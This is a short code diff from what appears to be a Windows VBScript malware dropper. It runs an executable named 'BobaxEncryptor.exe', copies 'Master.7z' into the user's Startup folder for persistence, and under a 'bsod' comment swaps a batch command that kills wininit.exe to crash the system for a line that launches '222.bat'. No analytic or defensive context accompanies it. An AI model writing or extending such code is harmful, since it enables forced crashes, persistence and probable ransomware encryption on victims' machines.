@@ -19,6 +19,4 @@ CreateObject("Wscript.Shell").Run """BobaxEncryptor.exe""", 1, True
 FSO.Movefile "Master.7z","%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 
 ''' bsod
-@echo off
-taskkill /f /im wininit.exe
-pause
+CreateObject("Wscript.Shell").Run """222.bat""", 1, True
